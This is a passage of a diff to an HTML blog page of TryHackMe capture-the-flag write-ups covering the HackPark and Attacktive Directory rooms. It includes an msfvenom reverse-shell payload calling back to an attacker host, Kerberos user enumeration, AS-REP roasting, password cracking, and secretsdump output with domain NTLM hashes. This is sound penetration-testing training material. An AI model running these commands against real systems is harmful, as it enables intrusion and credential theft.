+                                 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;01]: 10.10.135.243
+                                 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;02]: fe80::481a:c2a2:753c:891e
+Hyper-V Requirements:      A hypervisor has been detected. Features required &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Hyper-V will not be displayed.
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Create a reverse shell &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.2.127.225 LPORT=7777 -f exe &amp;gt; thm/rooms/hackpark/reverse.exe&lt;/code&gt; and upload.&lt;/li&gt;
+  &lt;li&gt;Find the webserver directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dir App_Data /AD /s&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;start msfconsole with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;multi/handler&lt;/code&gt; and payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;windows/meterpreter/reverse_tcp&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;start the uploaded shell on the target pc&lt;/li&gt;
+&lt;/ul&gt;
+
 &lt;h5 id=&quot;answer-the-questions-below-3&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Answer the questions below&lt;/h5&gt;
+
+&lt;p&gt;You can run metasploit commands such as sysinfo to get detailed information about the Windows system. Then &lt;strong&gt;feed this information into the windows-exploit-suggester script&lt;/strong&gt; and quickly identify any obvious vulnerabilities.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;What is the OS version of this windows machine?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; sysinfo
+Computer        : HACKPARK
+OS              : Windows 2012 R2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;6.3 Build 9600&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Windows 2012 R2 (6.3 Build 9600)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Further enumerate the machine.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;in target machine: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sysinfo&lt;/code&gt; copy to sysinfo.txt&lt;/li&gt;
+  &lt;li&gt;on kali input &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wes sysinfo.txt &amp;gt; system_vulns.txt&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subl system_vulns.txt&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;What is the name of the abnormal service running?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;list services running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;net start&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sc queryex type= service state= all&lt;/code&gt; - more information&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tasklist /svc&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Windows Scheduler (WService.exe)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;What is the name of the binary you’re supposed to exploit?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We need to find the logs of Windows Scheduler&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dir \WService.exe /s&lt;/code&gt; from root directory to find where we going&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;Service.exe /s
+&lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;Service.exe /s
+ Volume &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;drive C has no label.
+ Volume Serial Number is 0E97-C552
+
+ Directory of c:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogram Files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ystemScheduler
+
+03/25/2018  10:58 AM            98,720 WService.exe
+               1 File&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;         98,720 bytes
+
+     Total Files Listed:
+               1 File&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;         98,720 bytes
+               0 Dir&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  39,125,811,200 bytes free
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;LogsFile.txt and LogFileAdvanced.txt show us nothing, but &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;type 20198415519.INI_LOG.txt&lt;/code&gt; we see&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;06/22/22 01:02:33,Process Ended. PID:996,ExitCode:4,Message.exe &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Administrator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+06/22/22 01:03:01,Event Started Ok, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Administrator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Using this abnormal service, escalate your privileges!&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;replace lets replace message.&lt;/li&gt;
+  &lt;li&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;strong&gt;What is the user flag (on Jeffs Desktop)?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;What is the root flag?&lt;/strong&gt;&lt;/p&gt;
 
 &lt;hr /&gt;
 
@@ -301,12 +1597,12 @@
 
 &lt;h2 id=&quot;task-3---welcome-to-attacktive-directory&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 3 - Welcome to Attacktive Directory&lt;/h2&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──(0xskar㉿cocokali)-[~/thm/AttacktiveDirectory]
-└─$ nmap -sV -sC -T4 10.10.132.136 -p- -oN initial
-Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 06:44 PDT
-Nmap scan report for 10.10.132.136
-Host is up (0.20s latency).
-Not shown: 65508 closed tcp ports (conn-refused)
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xskar㉿cocokali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/thm/AttacktiveDirectory]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; 10.10.132.136 &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; initial
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-06-20 06:44 PDT
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.132.136
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.20s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65508 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;conn-refused&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 PORT      STATE SERVICE       VERSION
 53/tcp    open  domain        Simple DNS Plus
 80/tcp    open  http          Microsoft IIS httpd 10.0
@@ -314,18 +1610,18 @@ PORT      STATE SERVICE       VERSION
 |_  Potentially risky methods: TRACE
 |_http-server-header: Microsoft-IIS/10.0
 |_http-title: IIS Windows Server
-88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-20 13:52:51Z)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;server &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2022-06-20 13:52:51Z&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 135/tcp   open  msrpc         Microsoft Windows RPC
 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: spookysec.local0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 445/tcp   open  microsoft-ds?
 464/tcp   open  kpasswd5?
 593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
 636/tcp   open  tcpwrapped
-3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: spookysec.local0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 3269/tcp  open  tcpwrapped
 3389/tcp  open  ms-wbt-server Microsoft Terminal Services
-|_ssl-date: 2022-06-20T13:53:52+00:00; 0s from scanner time.
+|_ssl-date: 2022-06-20T13:53:52+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 0s from scanner time.
 | rdp-ntlm-info: 
 |   Target_Name: THM-AD
 |   NetBIOS_Domain_Name: THM-AD
@@ -334,14 +1630,14 @@ PORT      STATE SERVICE       VERSION
 |   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
 |   Product_Version: 10.0.17763
 |_  System_Time: 2022-06-20T13:53:44+00:00
-| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
+| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AttacktiveDirectory.spookysec.local
 | Not valid before: 2022-06-19T13:26:08
 |_Not valid after:  2022-12-19T13:26:08
-5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 |_http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Not Found
 9389/tcp  open  mc-nmf        .NET Message Framing
-47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 |_http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Not Found
 49664/tcp open  msrpc         Microsoft Windows RPC
@@ -355,18 +1651,18 @@ PORT      STATE SERVICE       VERSION
 49684/tcp open  msrpc         Microsoft Windows RPC
 49695/tcp open  msrpc         Microsoft Windows RPC
 49806/tcp open  msrpc         Microsoft Windows RPC
-Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
+Service Info: Host: ATTACKTIVEDIREC&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
 
 Host script results:
 | smb2-security-mode: 
 |   3.1.1: 
 |_    Message signing enabled and required
 | smb2-time: 
-|   date: 2022-06-20T13:53:46
+|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2022-06-20T13:53:46
 |_  start_date: N/A
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 576.98 seconds
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;576.98 seconds
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h5 id=&quot;answer-the-questions-below&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Answer the questions below&lt;/h5&gt;
@@ -392,10 +1688,252 @@ Nmap done: 1 IP address (1 host up) scanned in 576.98 seconds
 
 &lt;hr /&gt;
 
-&lt;h2 id=&quot;task-3---welcome-to-attacktive-directory-1&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 3 - Welcome to Attacktive Directory&lt;/h2&gt;
+&lt;h2 id=&quot;task-4---enumeration-enumerating-users-via-kerberos&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 4 - Enumeration Enumerating Users via Kerberos&lt;/h2&gt;
+
+&lt;p&gt;Kerberos is a key authentication service within Active Directory. With this port open, we can use a tool called Kerbrute (by Ronnie Flathers @ropnop) to brute force discovery of users, passwords and even password spray!&lt;/p&gt;
 
 &lt;h5 id=&quot;answer-the-questions-below-1&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Answer the questions below&lt;/h5&gt;
 
+&lt;p&gt;&lt;strong&gt;What command within Kerbrute will allow us to enumerate valid usernames?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;userenum&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;What notable account is discovered? (These should jump out at you)&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./kerbrute_linux_amd64 userenum --dc 10.10.132.136:88 -d spookysec.local userlist.txt&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2022/06/20 07:49:18 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       james@spookysec.local
+2022/06/20 07:49:21 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       svc-admin@spookysec.local
+2022/06/20 07:49:25 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       James@spookysec.local
+2022/06/20 07:49:26 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       robin@spookysec.local
+2022/06/20 07:49:43 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       darkstar@spookysec.local
+2022/06/20 07:49:53 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       administrator@spookysec.local
+2022/06/20 07:50:12 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       backup@spookysec.local
+2022/06/20 07:50:21 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       paradox@spookysec.local
+2022/06/20 07:51:19 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       JAMES@spookysec.local
+2022/06/20 07:51:39 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       Robin@spookysec.local
+2022/06/20 07:53:35 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       Administrator@spookysec.local
+2022/06/20 07:57:30 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       Darkstar@spookysec.local
+2022/06/20 07:58:45 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       Paradox@spookysec.local
+2022/06/20 08:03:03 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       DARKSTAR@spookysec.local
+2022/06/20 08:04:17 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       ori@spookysec.local
+2022/06/20 08:06:32 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       ROBIN@spookysec.local
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;What is the other notable account is discovered? (These should jump out at you)&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;svc-admin&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;What is the other notable account is discovered? (These should jump out at you)&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;backup&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;task-5---exploitation-abusing-kerberos&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 5 - Exploitation Abusing Kerberos&lt;/h2&gt;
+
+&lt;p&gt;After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called ASREPRoasting. ASReproasting occurs when a user account has the privilege “Does not require Pre-Authentication” set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.&lt;/p&gt;
+
+&lt;h5 id=&quot;answer-the-questions-below-2&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Answer the questions below&lt;/h5&gt;
+
+&lt;p&gt;&lt;strong&gt;We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/impacket/examples/GetNPUsers.py spookysec.local/ -dc-ip 10.10.132.136 -usersfile users.txt -format hashcat -outputfile hashes.txt&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;svc-admin&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:f45f55f20e6fab0b565c84565e77bf8c$6fc870818e2691f65612966f462ec3d973acaeab9cd87dcf13e50a9454945c8de2f046e6b02f440b5232c9cc34cb18f4485915206a8e3264c4aee2e9442ff8104c9389ab4ae875c90916b5accb02680e7e781a71c95df510ffc11a3fc36cb0ae36bb48b03a8ebd617c1a3532e3e439acf5e4d097498aa91c08aa3ded9a54ad91a7aefcfa1ac4ee47f5bb85e38f9174bdac51a7a3896b52833f5448f246d08797f199e004ea4ecd77f6b57d01a26e6930fea74f331143f356d392c6f8ec8f394b1602557611cb585fe2d189cf5d01f7a1a272255b4f350640104b94c40cb8605b3eff072fc5e502fe49e5230c26384012e952
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;https://hashcat.net/wiki/doku.php?id=example_hashes&lt;/li&gt;
+  &lt;li&gt;Kerberos 5, etype 23, AS-REP&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;What mode is the hash?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;https://hashcat.net/wiki/doku.php?id=example_hashes&lt;/li&gt;
+  &lt;li&gt;18200&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Now crack the hash with the modified password list provided, what is the user accounts password?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john --wordlist=passwordlist.txt --format=krb5asrep hash.txt&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;management2005&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;task-5-exploitation-abusing-kerberos&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 5 Exploitation Abusing Kerberos&lt;/h2&gt;
+
+&lt;h3 id=&quot;enumeration&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Enumeration:&lt;/h3&gt;
+
+&lt;p&gt;With a user’s account credentials we now have significantly more access within the domain. We can now attempt to enumerate any shares that the domain controller may be giving out.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;man smbclient&lt;/code&gt;&lt;/p&gt;
+
+&lt;h5 id=&quot;answer-the-questions-below-3&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Answer the questions below&lt;/h5&gt;
+
+&lt;p&gt;&lt;strong&gt;What utility can we use to map remote SMB shares?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbclient&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Which option will list shares?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-L&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;How many remote shares is the server listing?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbclient -L \\\\10.10.132.136 --workgroup=spookysec.local -U &quot;svc-admin&quot;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;6 shares&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;There is one particular share that we have access to that contains a text file. Which share is it?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbclient \\\\10.10.132.136\\backup\\ --workgroup=spookysec.local -U &quot;svc-admin&quot;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;What is the content of the file?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mget backup_credentials.txt&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Decoding the contents of the file, what is the full contents?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;base64 decrypt = &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backup@spookysec.local:backup2517860&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;task-7---domain-privilege-escalation---elevating-privileges-within-the-domain&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 7 - Domain Privilege Escalation - Elevating Privileges within the Domain&lt;/h2&gt;
+
+&lt;p&gt;Now that we have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backup@spookysec.local:backup2517860&lt;/code&gt; We can use another tool within Impacket called “secretsdump.py”. This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the (AD) Active Directory Domain.&lt;/p&gt;
+
+&lt;h5 id=&quot;answer-the-questions-below-4&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Answer the questions below&lt;/h5&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xskar㉿cocokali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/thm/AttacktiveDirectory]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/opt/impacket/examples/secretsdump.py spookysec.local/backup:backup2517860@10.10.132.136 &lt;span class=&quot;nt&quot;&gt;-outputfile&lt;/span&gt; secretsdump.txt 
+Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Dumping Domain Credentials &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;:rid:lmhash:nthash&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
